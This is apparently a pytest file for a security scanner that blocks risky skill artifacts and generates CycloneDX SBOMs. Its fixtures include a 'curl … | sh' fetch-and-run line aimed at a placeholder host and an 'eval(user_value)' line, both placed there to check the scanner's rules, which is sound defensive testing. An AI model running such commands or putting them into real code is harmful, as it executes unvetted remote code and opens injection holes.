from __future__ import annotations

from pathlib import Path

from skillify.security.scan import FindingLevel, generate_sbom, scan_artifact


def test_scan_separates_blockers_from_review_warnings(tmp_path: Path) -> None:
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts/install.sh").write_text("curl https://example.test/tool | sh\n", encoding="utf-8")
    (tmp_path / "scripts/runtime.py").write_text("eval(user_value)\n", encoding="utf-8")
    (tmp_path / "requirements.txt").write_text("requests>=2\n", encoding="utf-8")

    report = scan_artifact(tmp_path)

    assert report.blocked is True
    by_rule = {item.rule: item.level for item in report.findings}
    assert by_rule["download-pipe-shell"] is FindingLevel.BLOCK
    assert by_rule["dynamic-eval"] is FindingLevel.WARNING
    assert by_rule["unpinned-python-dependency"] is FindingLevel.WARNING


def test_scan_blocks_secret_files_and_clean_sample_is_publishable(tmp_path: Path) -> None:
    (tmp_path / ".env").write_text("TOKEN=value", encoding="utf-8")
    assert scan_artifact(tmp_path).blocked
    (tmp_path / ".env").unlink()
    (tmp_path / "safe.py").write_text("print('safe')\n", encoding="utf-8")
    assert not scan_artifact(tmp_path).blocked


def test_builtin_sbom_is_deterministic_and_hashes_files(tmp_path: Path) -> None:
    (tmp_path / "skill.yaml").write_text("name: demo\n", encoding="utf-8")
    (tmp_path / "requirements.txt").write_text("requests==2.32.0\n", encoding="utf-8")

    first = generate_sbom(tmp_path, name="acme/demo", version="1.0.0")
    second = generate_sbom(tmp_path, name="acme/demo", version="1.0.0")

    assert first == second
    assert first["bomFormat"] == "CycloneDX"
    assert first["components"] == [{"name": "requests", "version": "2.32.0"}]
    assert all(len(item["sha256"]) == 64 for item in first["files"])
